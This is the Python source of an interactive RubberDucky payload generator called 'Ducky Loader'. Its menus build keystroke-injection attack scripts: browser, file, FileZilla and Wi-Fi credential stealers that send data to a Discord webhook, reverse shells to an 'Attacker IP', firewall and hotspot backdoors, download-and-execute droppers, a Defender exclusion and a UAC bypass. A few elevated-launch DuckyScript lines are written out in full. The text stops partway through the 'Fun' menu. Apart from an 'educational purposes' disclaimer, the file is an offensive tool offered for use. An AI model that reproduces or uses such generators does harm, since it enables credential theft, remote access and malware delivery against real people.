import os, sys, signal
from modules import WindowsModule, pannelevasion, LinuxModule
from colorama import init, Fore, Style

init()

disclaimer = """
This RubberDucky payload generator is provided for educational purposes only.
The use of this software to perform malicious or illegal actions is strictly prohibited.
The author of this program takes no responsibility for any damage resulting from the use of this software.
The user is solely responsible for their actions and is encouraged to abide by the laws and regulations in their jurisdiction.

The particularity of Ducky Loader is that it employs an all-in-one methodology with automatic error handling through the command prompt, resulting in faster and more reliable execution.
"""


#########################################################
# ====================== Banners ====================== #
#########################################################

banner = (
    f"{Fore.YELLOW}                                 %%%%%%%%%%%%%%%%%%%%%%%%\n"
    f"                             %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%\n"
    f"                          %%###################################%%         {Fore.GREEN}Coded by : {Fore.RED}raphaelthief{Fore.YELLOW}\n"
    f"                        %#########################################%       {Fore.GREEN}Product : Colt45 Production {Fore.RED}V1.0{Fore.YELLOW}\n"
    f"                       ########################***********##########%\n"
    f"                     %##****************************************######\n"
    f"                    %***********************************************###\n"
    f"                   %*********+++++++***+++++++++++++++++++++++********##\n"
    f"                   ****+***++++++++++++++++++++++++++++++++++++###******#\n"
    f"                  #*++*{Fore.RED}%@#*%{Fore.YELLOW}+++++++++++++==============+++++++{Fore.RED}%++@@#{Fore.YELLOW}*****%\n"
    f"                  *+++{Fore.RED}%@@*#@*{Fore.YELLOW}+++++++++====+++++============++{Fore.RED}*@%*@@@#{Fore.YELLOW}++**#\n"
    f"                 %+++*{Fore.RED}@@@@@%{Fore.YELLOW}++++++++++++#%%%%%%%#*===========+{Fore.RED}%@@@@@%{Fore.YELLOW}+++**%\n"
    f"                 #++++{Fore.RED}%%%%%{Fore.YELLOW}+++===++=++#%%%%%%%%%%%%*+=========+{Fore.RED}#%@@@*{Fore.YELLOW}+++**%\n"
    f"                 *+++++**+========+*#%%%%@@@@@@@%%%%%#*++========++++++++*%\n"
    f"                 *++==========+*#%%%%%%%%######%%%%%%%%%%%#*=========++++*%\n"
    f"                 #+=======---=*######**************########*=-=======++++*%\n"
    f"                 %+===--------=++************************+=----======++++*\n"
    f"                  *===------------==+++*************++=-------=======++++%\n"
    f"                  %==========------------========---------===========+++*\n"
    f"                   +==------------------------------------===========+++#\n"
    f"                  %++===---------------------------------------=====+++*#\n"
    f"                 %*++++================---=======================+++++***#%\n"
    f"                #**+++++++++++++++++++++=======++++++++++++++++++++******###%\n"
    f"             %#*{Fore.GREEN} ____{Fore.YELLOW}++++++++++++ {Fore.GREEN}_ {Fore.YELLOW}++++++++++ {Fore.GREEN}_ {Fore.YELLOW}+++++++++++++++++  {Fore.GREEN}_ {Fore.YELLOW}+++++++#%\n"
    f"            #***{Fore.GREEN}|  _ \ _   _  ___| | ___   _  | |    ___   __ _  __| | ___ _ __{Fore.YELLOW}#%\n"
    f"          #**+++{Fore.GREEN}| | | | | | |/ __| |/ / | | | | |   / _ \ / _` |/ _` |/ _ \ '__|{Fore.YELLOW}##\n"
    f"        %*++++++{Fore.GREEN}| |_| | |_| | (__|   <| |_| | | |__| (_) | (_| | (_| |  __/ |{Fore.YELLOW}*****#%%\n"
    f"    %#***+++++++{Fore.GREEN}|____/ \__,_|\___|_|\_\\__,  | |_____\___/ \__,_|\__,_|\___|_|{Fore.YELLOW}*****#####%\n"
    f"  %******++++++========================{Fore.GREEN}|___/{Fore.YELLOW}========++++++++++++++++++++++++*********###%\n"
    f" #+++++++=================================================++++++++++++++++++++++++++++****#"
)

menu = (
    f"{Fore.GREEN} ____             _            _                    _\n"
    f"|  _ \ _   _  ___| | ___   _  | |    ___   __ _  __| | ___ _ __ \n"
    f"| | | | | | |/ __| |/ / | | | | |   / _ \ / _` |/ _` |/ _ \ '__|\n"
    f"| |_| | |_| | (__|   <| |_| | | |__| (_) | (_| | (_| |  __/ |\n"
    f"|____/ \__,_|\___|_|\_\\_ _, | |_____\___/ \__,_|\__,_|\___|_|\n"
    f"                       |___/\n"
)

def cleanit():
    os.system('cls' if os.name == 'nt' else 'clear') # Linux or Windows OS detection & compatibility

def exitapp():
    print(f"\n{Fore.RED}Closing ...")
    exit()

def errormenu():
    print(f"{Fore.RED}Invalid choice ...\n")
    input(f"{Fore.GREEN}Press [ENTER] to continue ...")

def recurrence():
    cleanit()
    print(menu)
    
def done():
    print("") # Good looking    
    input(f"{Fore.YELLOW}Done ! Press [ENTER] to continue ...")
    recurrence()
    selectmenu() # Go back to main menu


#########################################################
# ====================== Ctrl + c ===================== #
#########################################################

def signal_handler(sig, frame):
    # Ce gestionnaire d'exception est appelé lorsque SIGINT est reçu (Ctrl+C)
    print(f'\n\n{Fore.RED}-------------------------------\n{Fore.RED}[Debug] {Fore.YELLOW}keyboard interrupt ...\n{Fore.RED}-------------------------------{Fore.GREEN}')
    sys.exit(0)

# Assigne le gestionnaire de signal au signal SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)


#########################################################
# ====================== Linux ======================== #
#########################################################

def linux():
    recurrence()

    print(f" {Fore.YELLOW}0{Fore.GREEN}. Go back")
    print(f" {Fore.YELLOW}1{Fore.GREEN}. Exit")
    print(f" {Fore.RED}2{Fore.GREEN}. Backdoors")
    
    choix = input(f"{Fore.YELLOW}Select 0 to 2 : {Fore.GREEN}")

    if choix == "0": # Back
        selectmenu()
        
    elif choix == "1": # Exit
        exitapp()   
        
    elif choix == "2":
        recurrence()
        reverse_shell()
        
        
    else: # Error
        errormenu()
        windows()
   

################## reverse_shell ##################

def reverse_shell(): 
    print(f" {Fore.YELLOW}0{Fore.GREEN}. Go back")
    print(f" {Fore.YELLOW}1{Fore.GREEN}. Exit")
    print(f" {Fore.RED}2{Fore.GREEN}. Bash")
    print(f" {Fore.RED}3{Fore.GREEN}. Python")


    choix = input(f"{Fore.YELLOW}Select 0 to 3 : {Fore.GREEN}")

    if choix == "0": # Back
        linux()
        
    elif choix == "1": # Exit
        exitapp()

    elif choix == "2": # reverse bash hidden
        recurrence()
        
        print("") # Good looking        

        Ipaddr = input(f"{Fore.YELLOW}Attacker IP : {Fore.GREEN}").strip()
        Port = input(f"{Fore.YELLOW}Port : {Fore.GREEN}").strip()

        LinuxModule.initfile("Backdoor_ReverseShellBash_Linux.txt")  
        LinuxModule.reverseshell_bash(Ipaddr, Port)
        done()
        
       
    elif choix == "3": # reverse python
        recurrence()
        print("") # Good looking        

        Ipaddr = input(f"{Fore.YELLOW}Attacker IP : {Fore.GREEN}").strip()
        Port = input(f"{Fore.YELLOW}Port : {Fore.GREEN}").strip()

        LinuxModule.initfile("Backdoor_ReverseShellPython_Linux.txt")   
        LinuxModule.reverseshellPython(Ipaddr, Port) 
        done()

        
    else: # Error
        errormenu()
        windows()
   

#########################################################
# ====================== Windows ====================== #
#########################################################

def windows():
    recurrence()

    print(f" {Fore.YELLOW}0{Fore.GREEN}. Go back")
    print(f" {Fore.YELLOW}1{Fore.GREEN}. Exit")
    print(f" {Fore.RED}2{Fore.GREEN}. Stealers")
    print(f" {Fore.RED}3{Fore.GREEN}. Backdoors")
    print(f" {Fore.RED}4{Fore.GREEN}. Droppers")
    print(f" {Fore.RED}5{Fore.GREEN}. OS access")
    print(f" {Fore.RED}6{Fore.GREEN}. Fun\n")    
    
    choix = input(f"{Fore.YELLOW}Select 0 to 6 : {Fore.GREEN}")

    if choix == "0": # Back
        selectmenu()
        
    elif choix == "1": # Exit
        exitapp()   
        
    elif choix == "2":
        recurrence()
        Stealers()
        
    elif choix == "3":
        recurrence()
        Backdoors()

    elif choix == "4":
        recurrence()
        Droppers()

    elif choix == "5":
        recurrence()
        OS_access()

    elif choix == "6":
        recurrence()
        Fun()

    else: # Error
        errormenu()
        windows()

################## Stealer ##################

def Stealers(): 
    print(f" {Fore.YELLOW}0{Fore.GREEN}. Go back")
    print(f" {Fore.YELLOW}1{Fore.GREEN}. Exit")
    print(f" {Fore.RED}2{Fore.GREEN}. Webbrowsers stealer")
    print(f" {Fore.RED}3{Fore.GREEN}. Files stealer")
    print(f" {Fore.RED}4{Fore.GREEN}. FileZilla stealer")
    print(f" {Fore.RED}5{Fore.GREEN}. Wifi creds stealer")
    print(f" {Fore.RED}6{Fore.GREEN}. PC infos stealer")
    print(f" {Fore.RED}7{Fore.GREEN}. Files + Webbrowsers + Wifi creds stealer\n")

    choix = input(f"{Fore.YELLOW}Select 0 to 7 : {Fore.GREEN}")

    if choix == "0": # Back
        selectmenu()
        
    elif choix == "1": # Exit
        exitapp()
        
    elif choix == "2": # ---------- Webbrowsers stealer
        recurrence()
        print("Select browsers 1 - 4 or 0 to cancel. You can choose multiple browsers separated by commas : 1,2,4")
        print(f" {Fore.YELLOW}0{Fore.GREEN}. Cancel")
        print(f" {Fore.RED}1{Fore.GREEN}. Chrome")
        print(f" {Fore.RED}2{Fore.GREEN}. Edge")
        print(f" {Fore.RED}3{Fore.GREEN}. Brave")
        print(f" {Fore.RED}4{Fore.GREEN}. Opera\n")
        

        choice = input(f"{Fore.YELLOW}Select : {Fore.GREEN}").strip()

        if choice == '0':
            recurrence()
            Stealers()
                
        browser_choices = choice.split(',')
        valid_choices = {'1', '2', '3', '4'}


        if all(c in valid_choices for c in browser_choices):
            browser_choices = [int(c) for c in browser_choices]
            if 1 in browser_choices:
                print(f"{Fore.YELLOW}[+] {Fore.GREEN}Chrome selected")
            if 2 in browser_choices:
                print(f"{Fore.YELLOW}[+] {Fore.GREEN}Edge selected")
            if 3 in browser_choices:
                print(f"{Fore.YELLOW}[+] {Fore.GREEN}Brave selected")
            if 4 in browser_choices:
                print(f"{Fore.YELLOW}[+] {Fore.GREEN}Opera selected")
            
            print("") # Good looking
            killnav = input(f"{Fore.YELLOW}Close webbrowsers to make sure to steal all files ? (y/n) {Fore.GREEN}")
            
            if killnav == "y": 
                print(f"{Fore.YELLOW}[+] {Fore.GREEN}Kill webbrowsers\n")
                
            elif killnav == "n": 
                print(f"{Fore.RED}[-] {Fore.GREEN}Don't kill webbrowsers\n")
                
            exfiltre = input(f"{Fore.YELLOW}Webhook discord : {Fore.GREEN}")
            
            # Let me coooooook
            WindowsModule.initfile("Webbrowsers_stealer.txt", "yes") # File name + cmd usage
            
            if exfiltre != "": # Parameter webook adress
                pass
            else:
                exfiltre = "Your_WebHook_There"            
            
            if killnav == "y": # Kill nav or not
                WindowsModule.killnav("y")
            elif killnav == "n":
                WindowsModule.killnav("n")            
            
            # Call main browser copy past 
            if 1 in browser_choices:
                WindowsModule.chrome()
            if 2 in browser_choices:
                WindowsModule.edge()
            if 3 in browser_choices:
                WindowsModule.brave()
            if 4 in browser_choices:
                WindowsModule.opera()           

            WindowsModule.cloturebrowser(exfiltre) # End the process

            done() # Back main menu
            
        else:
            errormenu()
            Stealers()
            
            
    elif choix == "3": # ---------- Files stealer
        recurrence()
        print("Choose file extensions you want to target, separated by commas : .txt,.docx,.pdf, etc ...")
        extensions = input(f"{Fore.YELLOW}Extensions to steal : {Fore.GREEN}")
       
        print("\nSelect folders you want to target, separated by commas (1,3) : ")
        print(f" {Fore.YELLOW}0{Fore.GREEN}. Cancel")
        print(f" {Fore.RED}1{Fore.GREEN}. Documents")
        print(f" {Fore.RED}2{Fore.GREEN}. Downloads")
        print(f" {Fore.RED}3{Fore.GREEN}. Desktop\n")
        choice = input(f"{Fore.YELLOW}Select : {Fore.GREEN}").strip()
        
        
        if choice == '0':
            recurrence()
            Stealers()
                
        files_choices = choice.split(',')
        valid_choices = {'1', '2', '3'}


        if all(c in valid_choices for c in files_choices):
        
            WindowsModule.initfile("Files_stealer.txt", "yes") # File name + cmd usage
        
            files_choices = [int(c) for c in files_choices]
            if 1 in files_choices:
                print(f"{Fore.YELLOW}[+] {Fore.GREEN}Documents selected")
                WindowsModule.documentsGET(extensions)
            if 2 in files_choices:
                print(f"{Fore.YELLOW}[+] {Fore.GREEN}Downloads selected")
                WindowsModule.downloadsGET(extensions)
            if 3 in files_choices:
                print(f"{Fore.YELLOW}[+] {Fore.GREEN}Desktop selected")
                WindowsModule.desktopGET(extensions)
                
            print("") # Good looking
            exfiltre = input(f"{Fore.YELLOW}Webhook discord : {Fore.GREEN}")
            
            if exfiltre != "": # Parameter webook adress
                pass
            else:
                exfiltre = "Your_WebHook_There"
            
            WindowsModule.cloturefiles(exfiltre) # End the process
            
            done() # Back main menu
            
        else:
            errormenu()
            Stealers()
        
    elif choix == "4": # ---------- FileZilla stealer
        recurrence()
        print(f"{Fore.YELLOW}[!] {Fore.GREEN}This one need admin rights")
        print("Select the method you want to use : ")
        print(f" {Fore.YELLOW}0{Fore.GREEN}. Cancel")
        print(f" {Fore.RED}1{Fore.GREEN}. Normal way (admin by default)")
        print(f" {Fore.RED}2{Fore.GREEN}. RunAS launch\n")
        choice = input(f"{Fore.YELLOW}Select : {Fore.GREEN}").strip()
        
        
        if choice == '0':
            recurrence()
            Stealers()
  
        elif choice == '1':
            WindowsModule.initfile("FileZilla_stealer.txt", "yes") # File name + cmd usage
        
        elif choice == '2':
            WindowsModule.initfile("FileZilla_stealer.txt", "runas") # File name + cmd usage
        
        else:
            errormenu()
            Stealers()
  
        print("") # Good looking
        exfiltre = input(f"{Fore.YELLOW}Webhook discord : {Fore.GREEN}")
        WindowsModule.cloturefileZellia(exfiltre) # Copy + send
        
        done() # Back main menu
        
    elif choix == "5": # ---------- Wifi creds stealer
        recurrence()
        WindowsModule.initfile("Wifi_stealer.txt", "yes")

        print("") # Good looking
        exfiltre = input(f"{Fore.YELLOW}Webhook discord : {Fore.GREEN}")
        WindowsModule.cloturewificreds(exfiltre)
        
        done() # Back main menu

    elif choix == "6": # ---------- PC infos stealer
        recurrence()
        print(f"{Fore.YELLOW}[!] {Fore.GREEN}This one need admin rights")
        print("Select the method you want to use : ")
        print(f" {Fore.YELLOW}0{Fore.GREEN}. Cancel")
        print(f" {Fore.RED}1{Fore.GREEN}. Normal way")
        print(f" {Fore.RED}2{Fore.GREEN}. RunAS launch\n")
        choice = input(f"{Fore.YELLOW}Select : {Fore.GREEN}").strip()
        
        
        if choice == '0':
            recurrence()
            Stealers()
  
        elif choice == '1':
            WindowsModule.initfile("PCInfos_stealer.txt", "yes") # File name + cmd usage
        
        elif choice == '2':
            WindowsModule.initfile("PCInfos_stealer.txt", "runas") # File name + cmd usage
        
        else:
            errormenu()
            Stealers()

        print("") # Good looking
        exfiltre = input(f"{Fore.YELLOW}Webhook discord : {Fore.GREEN}")
        
        WindowsModule.PCInfosget(exfiltre)
        done()
    
    elif choix == "7": # ---------- Files + Webbrowsers + Wifi creds stealer
        recurrence()

        print("Choose file extensions you want to target, separated by commas : .txt,.docx,.pdf, etc ...")
        extensions = input(f"{Fore.YELLOW}Extensions to steal : {Fore.GREEN}")
       
        print("\nSelect folders you want to target, separated by commas (1,3) : ")
        print(f" {Fore.YELLOW}0{Fore.GREEN}. Cancel")
        print(f" {Fore.RED}1{Fore.GREEN}. Documents")
        print(f" {Fore.RED}2{Fore.GREEN}. Downloads")
        print(f" {Fore.RED}3{Fore.GREEN}. Desktop\n")
        choice = input(f"{Fore.YELLOW}Select : {Fore.GREEN}").strip()
        
        if choice == '0':
            recurrence()
            Stealers()
                
        files_choices = choice.split(',')
        valid_choices = {'1', '2', '3'}

        WindowsModule.initfile("All_In_One_stealer.txt", "yes") # File name + cmd usage
        
        if all(c in valid_choices for c in files_choices):
        
            files_choices = [int(c) for c in files_choices]
            if 1 in files_choices:
                print(f"{Fore.YELLOW}[+] {Fore.GREEN}Documents selected")
                WindowsModule.documentsGET1(extensions)
            if 2 in files_choices:
                print(f"{Fore.YELLOW}[+] {Fore.GREEN}Downloads selected")
                WindowsModule.downloadsGET1(extensions)
            if 3 in files_choices:
                print(f"{Fore.YELLOW}[+] {Fore.GREEN}Desktop selected")
                WindowsModule.desktopGET1(extensions)
        
        print("") # Good looking        
        print("Select browsers 1 - 4 or 0 to cancel. You can choose multiple browsers separated by commas : 1,2,4")
        print(f" {Fore.YELLOW}0{Fore.GREEN}. Cancel")
        print(f" {Fore.RED}1{Fore.GREEN}. Chrome")
        print(f" {Fore.RED}2{Fore.GREEN}. Edge")
        print(f" {Fore.RED}3{Fore.GREEN}. Brave")
        print(f" {Fore.RED}4{Fore.GREEN}. Opera\n")
        
        choice2 = input(f"{Fore.YELLOW}Select : {Fore.GREEN}").strip()

        if choice2 == '0':
            if os.path.exists("All_In_One_stealer.txt"):
                os.remove("All_In_One_stealer.txt")
            recurrence()
            Stealers()

        browser_choices = choice2.split(',')
        valid_choices = {'1', '2', '3', '4'}


        if all(c in valid_choices for c in browser_choices):
            browser_choices = [int(c) for c in browser_choices]
            if 1 in browser_choices:
                print(f"{Fore.YELLOW}[+] {Fore.GREEN}Chrome selected")
            if 2 in browser_choices:
                print(f"{Fore.YELLOW}[+] {Fore.GREEN}Edge selected")
            if 3 in browser_choices:
                print(f"{Fore.YELLOW}[+] {Fore.GREEN}Brave selected")
            if 4 in browser_choices:
                print(f"{Fore.YELLOW}[+] {Fore.GREEN}Opera selected")
            
            print("") # Good looking
            killnav = input(f"{Fore.YELLOW}Close webbrowsers to make sure to steal all files ? (y/n) {Fore.GREEN}")
            
            if killnav == "y": 
                print(f"{Fore.YELLOW}[+] {Fore.GREEN}Kill webbrowsers\n")
                
            elif killnav == "n": 
                print(f"{Fore.RED}[-] {Fore.GREEN}Don't kill webbrowsers\n")
                
            if killnav == "y": # Kill nav or not
                WindowsModule.killnav("y")
            elif killnav == "n":
                WindowsModule.killnav("n")            
            
            # Call main browser copy past 
            if 1 in browser_choices:
                WindowsModule.chrome1()
            if 2 in browser_choices:
                WindowsModule.edge1()
            if 3 in browser_choices:
                WindowsModule.brave1()
            if 4 in browser_choices:
                WindowsModule.opera1()          

        print("") # Good looking
        wifi = input(f"{Fore.YELLOW}Wifi creds stealer (y/n) : {Fore.GREEN}")      

        print("") # Good looking
        exfiltre = input(f"{Fore.YELLOW}Webhook discord : {Fore.GREEN}")

        if wifi == "y": 
            WindowsModule.wifitit(exfiltre)
        else:        
            WindowsModule.closefinal(exfiltre)
            
        done() # Back main menu
        
    else: # Error
        errormenu()
        windows()

    
################## Backdoors ##################
def Backdoors():  
    print(f" {Fore.YELLOW}0{Fore.GREEN}. Go back")
    print(f" {Fore.YELLOW}1{Fore.GREEN}. Exit")
    print(f" {Fore.RED}2{Fore.GREEN}. Set open port")
    print(f" {Fore.RED}3{Fore.GREEN}. Open wifi hotspot (may not work on every PC)")
    print(f" {Fore.RED}4{Fore.GREEN}. Reverse shell - Powershell 100% and may be flagged by Defender")
    print(f" {Fore.RED}5{Fore.GREEN}. Reverse shell - Requires Python and may keep a Command Prompt window open on the taskbar\n")

    choix = input(f"{Fore.YELLOW}Select 0 to 5 : {Fore.GREEN}")

    if choix == "0": # Back
        selectmenu()

    elif choix == "1": # Exit
        exitapp()

    elif choix == "2":
        recurrence()
        print(f"{Fore.YELLOW}[!] {Fore.GREEN}This one need admin rights")
        print("Select the method you want to use : ")
        print(f" {Fore.YELLOW}0{Fore.GREEN}. Cancel")
        print(f" {Fore.RED}1{Fore.GREEN}. Normal way (admin by default)")
        print(f" {Fore.RED}2{Fore.GREEN}. RunAS launch\n")
        choice = input(f"{Fore.YELLOW}Select : {Fore.GREEN}").strip()
        
        
        if choice == '0':
            recurrence()
            Stealers()
  
        elif choice == '1':
            WindowsModule.initfile("Backdoor_port.txt", "yes") # File name + cmd usage
        
        elif choice == '2':
            WindowsModule.initfile("Backdoor_port.txt", "runas") # File name + cmd usage
        
        else:
            errormenu()
            Stealers()
 
        print("") # Good looking
        choice_name = input(f"{Fore.YELLOW}Firewall rule name : {Fore.GREEN}").strip()
        choice_port = input(f"{Fore.YELLOW}Port number : {Fore.GREEN}").strip()
        
        WindowsModule.backport(choice_name, choice_port)
        done()
        
    elif choix == "3": # wifi acces point
     
        recurrence()
        print(f"{Fore.YELLOW}[!] {Fore.GREEN}This one need admin rights")
        print("Select the method you want to use : ")
        print(f" {Fore.YELLOW}0{Fore.GREEN}. Cancel")
        print(f" {Fore.RED}1{Fore.GREEN}. Normal way (admin by default)")
        print(f" {Fore.RED}2{Fore.GREEN}. RunAS launch\n")
        choice = input(f"{Fore.YELLOW}Select : {Fore.GREEN}").strip()
        
        
        if choice == '0':
            recurrence()
            Stealers()
  
        elif choice == '1':
            WindowsModule.initfile("Backdoor_hotspot.txt", "yes") # File name + cmd usage
        
        elif choice == '2':
            WindowsModule.initfile("Backdoor_hotspot.txt", "runas") # File name + cmd usage
        
        else:
            errormenu()
            Stealers()
        
        print("") # Good looking
        ESSID = input(f"{Fore.YELLOW}ESSID name : {Fore.GREEN}").strip()
        PASS = input(f"{Fore.YELLOW}Set password (minimum 8 characters) : {Fore.GREEN}").strip()
        
        WindowsModule.backport(ESSID, PASS)
        done()

    elif choix == "4": # reverse powershell
        
        recurrence()
        print(f"{Fore.YELLOW}[!] {Fore.GREEN}Do you want use admin admin rights ?")
        print("Select the method you want to use : ")
        print(f" {Fore.YELLOW}0{Fore.GREEN}. Cancel")
        print(f" {Fore.RED}1{Fore.GREEN}. Normal way")
        print(f" {Fore.RED}2{Fore.GREEN}. RunAS launch\n")
        choice = input(f"{Fore.YELLOW}Select : {Fore.GREEN}").strip()
        
        if choice == '0':
            recurrence()
            Stealers()
  
        elif choice == '1':
            WindowsModule.initfile("Backdoor_ReverseShell.txt", "yes") # File name + cmd usage
        
        elif choice == '2':
            WindowsModule.initfile("Backdoor_ReverseShell.txt", "runas") # File name + cmd usage
        
        else:
            errormenu()
            Stealers()
            
        print("") # Good looking
        Ipaddr = input(f"{Fore.YELLOW}Attacker IP : {Fore.GREEN}").strip()
        Port = input(f"{Fore.YELLOW}Port : {Fore.GREEN}").strip()

        WindowsModule.reverseshell(Ipaddr, Port) # File name + cmd usage
        done()

    elif choix == "5": # reverse python

        recurrence()
        print(f"{Fore.YELLOW}[!] {Fore.GREEN}Do you want use admin admin rights ?")
        print("Select the method you want to use : ")
        print(f" {Fore.YELLOW}0{Fore.GREEN}. Cancel")
        print(f" {Fore.RED}1{Fore.GREEN}. Normal way")
        print(f" {Fore.RED}2{Fore.GREEN}. RunAS launch\n")
        choice = input(f"{Fore.YELLOW}Select : {Fore.GREEN}").strip()
        
        if choice == '0':
            recurrence()
            Stealers()
  
        elif choice == '1':
            WindowsModule.initfile("Backdoor_ReverseShellPython.txt", "yes") # File name + cmd usage
        
        elif choice == '2':
            WindowsModule.initfile("Backdoor_ReverseShellPython.txt", "runas") # File name + cmd usage
        
        else:
            errormenu()
            Stealers()
            
        print("") # Good looking
        Ipaddr = input(f"{Fore.YELLOW}Attacker IP : {Fore.GREEN}").strip()
        Port = input(f"{Fore.YELLOW}Port : {Fore.GREEN}").strip()

        WindowsModule.reverseshellPython(Ipaddr, Port) # File name + cmd usage
        done()


################## Droppers ##################
def Droppers(): 
    print(f" {Fore.YELLOW}0{Fore.GREEN}. Go back")
    print(f" {Fore.YELLOW}1{Fore.GREEN}. Exit")
    print(f" {Fore.RED}2{Fore.GREEN}. Download & execute")
    print(f" {Fore.RED}3{Fore.GREEN}. Folder exception + Download & execute - need admin rights")
    print(f" {Fore.RED}4{Fore.GREEN}. UAC bypass + Folder exception + Download & execute (msconfig bad config exploit)")
    print(f" {Fore.RED}5{Fore.GREEN}. Drop & decode base64 executable\n")
    
    choix = input(f"{Fore.YELLOW}Select 0 to 4 : {Fore.GREEN}")

    if choix == "0": # Back
        selectmenu()
        
    elif choix == "1": # Exit
        exitapp()

    elif choix == "2": 
        
        recurrence()
        WindowsModule.initfile("Download_execute.txt", "yes") # File name + cmd usage
        print("") # Good looking
        Stock = input(f"{Fore.YELLOW}Drop location : {Fore.GREEN}")
        print("") # Good looking
        link = input(f"{Fore.YELLOW}Download link : {Fore.GREEN}")
        
        WindowsModule.mode1(Stock, link)
        Done()
        
    elif choix == "3": 
        
        recurrence()
        print(f"{Fore.YELLOW}[!] {Fore.GREEN}Do you want use admin admin rights ?")
        print("Select the method you want to use : ")
        print(f" {Fore.YELLOW}0{Fore.GREEN}. Cancel")
        print(f" {Fore.RED}1{Fore.GREEN}. Normal way")
        print(f" {Fore.RED}2{Fore.GREEN}. RunAS launch\n")
        choice = input(f"{Fore.YELLOW}Select : {Fore.GREEN}").strip()
        
        if choice == '0':
            recurrence()
            Stealers()
        elif choice == '1':
            WindowsModule.initfile("Download_execute_antiDefender.txt", "yes") # File name + cmd usage
        elif choice == '2':
            WindowsModule.initfile("Download_execute_antiDefender.txt", "runas") # File name + cmd usage
        else:
            errormenu()
            Stealers()
            
        print("") # Good looking
        Stock = input(f"{Fore.YELLOW}Drop location : {Fore.GREEN}%USERPROFILE%\\")
        print("") # Good looking
        link = input(f"{Fore.YELLOW}Download link : {Fore.GREEN}")
        
        WindowsModule.mode1(Stock, link)
        Done()
            
    elif choix == "4": 
        print("") # Good looking
        Stock = input(f"{Fore.YELLOW}Drop location : {Fore.GREEN}%USERPROFILE%\\")
        print("") # Good looking
        link = input(f"{Fore.YELLOW}Download link : {Fore.GREEN}")
        WindowsModule.mode3(Stock, link)
        done()

    elif choix == "5": 
        print("") # Good looking
        Except = input(f"{Fore.YELLOW}Add exclusion to Defender - need admin rights (y/n) : {Fore.GREEN}")
        print("") # Good looking
        link = input(f"{Fore.YELLOW}Download link (.txt file) : {Fore.GREEN}")
        
        if Except == "y":
            WindowsModule.initfile("Base64_Dropper.txt", "runas") # File name + cmd usage
        else:
            WindowsModule.initfile("Base64_Dropper.txt", "yes") # File name + cmd usage
        
        WindowsModule.drop64(link)
        done()

################## OS_access ##################
def OS_access(): 
    print(f" {Fore.YELLOW}0{Fore.GREEN}. Go back")
    print(f" {Fore.YELLOW}1{Fore.GREEN}. Exit")
    print(f" {Fore.RED}2{Fore.GREEN}. Pannel evasion")
    print(f" {Fore.RED}3{Fore.GREEN}. Windows keypad")
    print(f" {Fore.RED}4{Fore.GREEN}. Start cmd")
    print(f" {Fore.RED}5{Fore.GREEN}. Start powershell")    
    print(f" {Fore.RED}6{Fore.GREEN}. Start registry")
    print(f" {Fore.RED}7{Fore.GREEN}. Start Task scheduler\n")
    
    choix = input(f"{Fore.YELLOW}Select 0 to 7 : {Fore.GREEN}")

    if choix == "0": # Back
        selectmenu()
        
    elif choix == "1": # Exit
        exitapp()

    elif choix == "2": # Pannel evasion
        pannelevasion.initfile()
        done()
        
    elif choix == "3": # Windows keypad
        WindowsModule.keypad()
        done()
        
    elif choix == "4": # Start cmd
        recurrence()
        print(f"{Fore.YELLOW}[!] {Fore.GREEN}Do you want use admin admin rights ?")
        print("Select the method you want to use : ")
        print(f" {Fore.YELLOW}0{Fore.GREEN}. Cancel")
        print(f" {Fore.RED}1{Fore.GREEN}. Normal way")
        print(f" {Fore.RED}2{Fore.GREEN}. RunAS launch\n")
        choice = input(f"{Fore.YELLOW}Select : {Fore.GREEN}").strip()
        
        if choice == '0':
            recurrence()
            Stealers()
        elif choice == '1':
            pass
        elif choice == '2':
            pass
        else:
            errormenu()
            Stealers()        
        with open("Launch_CMD.txt", 'w') as file:
            file.write("DELAY 250\nGUI r\nDELAY 500\n")
            if choice == '1':
                file.write("STRING cmd\nENTER")
            elif choice == '2':
                file.write("STRING powershell Start-Process cmd -Verb runAs\nENTER\nDELAY 2000\nLEFTARROW\nENTER")
        done()
        
    elif choix == "5": # Start powershell
        recurrence()
        print(f"{Fore.YELLOW}[!] {Fore.GREEN}Do you want use admin admin rights ?")
        print("Select the method you want to use : ")
        print(f" {Fore.YELLOW}0{Fore.GREEN}. Cancel")
        print(f" {Fore.RED}1{Fore.GREEN}. Normal way")
        print(f" {Fore.RED}2{Fore.GREEN}. RunAS launch\n")
        choice = input(f"{Fore.YELLOW}Select : {Fore.GREEN}").strip()
        
        if choice == '0':
            recurrence()
            Stealers()
        elif choice == '1':
            pass
        elif choice == '2':
            pass
        else:
            errormenu()
            Stealers()        
        with open("Launch_Powershell.txt", 'w') as file:
            file.write("DELAY 250\nGUI r\nDELAY 500\n")
            if choice == '1':
                file.write("STRING powershell\nENTER")
            elif choice == '2':
                file.write("STRING powershell Start-Process powershell -Verb runAs\nENTER\nDELAY 2000\nLEFTARROW\nENTER")
        done()     
        
    elif choix == "6": # Start registry
        recurrence()
        print(f"{Fore.YELLOW}[!] {Fore.GREEN}Do you want use admin admin rights ?")
        print("Select the method you want to use : ")
        print(f" {Fore.YELLOW}0{Fore.GREEN}. Cancel")
        print(f" {Fore.RED}1{Fore.GREEN}. Normal way")
        print(f" {Fore.RED}2{Fore.GREEN}. RunAS launch\n")
        choice = input(f"{Fore.YELLOW}Select : {Fore.GREEN}").strip()
        
        if choice == '0':
            recurrence()
            Stealers()
        elif choice == '1':
            pass
        elif choice == '2':
            pass
        else:
            errormenu()
            Stealers()        
        with open("Launch_Registry.txt", 'w') as file:
            file.write("DELAY 250\nGUI r\nDELAY 500\n")
            if choice == '1':
                file.write("STRING regedit\nENTER")
            elif choice == '2':
                file.write("STRING powershell Start-Process regedit -Verb runAs\nENTER\nDELAY 2000\nLEFTARROW\nENTER")
        done()   
        
    elif choix == "7": # Start Task scheduler
        recurrence()
               
        with open("Launch_Task_Shelduer.txt", 'w') as file:
            file.write("DELAY 250\nGUI r\nDELAY 500\nSTRING taskschd.msc\nENTER")
        done()  
        
        
################## Fun ##################
def Fun(): 
    print(f" {Fore.YELLOW}0{Fore.GREEN}. Go back")
    print(f" {Fore.YELLOW}1{Fore.GREEN}. Exit")
    print(f" {Fore.RED}2{Fore.GREEN}. Rick roll CMD")
    print(f" {Fore.RED}3{Fore.GREEN}. Lanch webpage\n")
    
    choix = input(f"{Fore.YELLOW}Select 0 to 3 : {Fore.GREEN}")

    if choix == "0": # Back
        selectmenu()
        
    elif choix == "1": # Exit
        exitapp()

    elif choix == "2": # Rick roll CMD
        recurrence()
